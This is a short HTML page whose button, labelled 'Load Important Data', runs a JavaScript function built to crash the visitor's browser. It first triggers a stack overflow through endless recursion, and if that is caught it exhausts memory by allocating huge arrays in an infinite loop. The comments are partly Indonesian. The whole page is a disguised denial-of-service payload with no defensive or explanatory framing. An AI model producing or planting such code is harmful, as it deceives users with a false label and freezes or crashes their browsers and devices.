<!DOCTYPE html>
<html>
<body>
<button onclick="magic3()">Load Important Data</button>

<script>
function magic3() {
    // Recursive function yang cause stack overflow
    function crash() {
        crash();
    }
    
    // Multiple approach crash
    try {
        // Method 1: Stack overflow
        crash();
    } catch(e) {
        // Method 2: Memory exhaustion
        const arr = [];
        while(true) {
            arr.push(new Array(1000000));
        }
    }
}
</script>
</body>
</html>
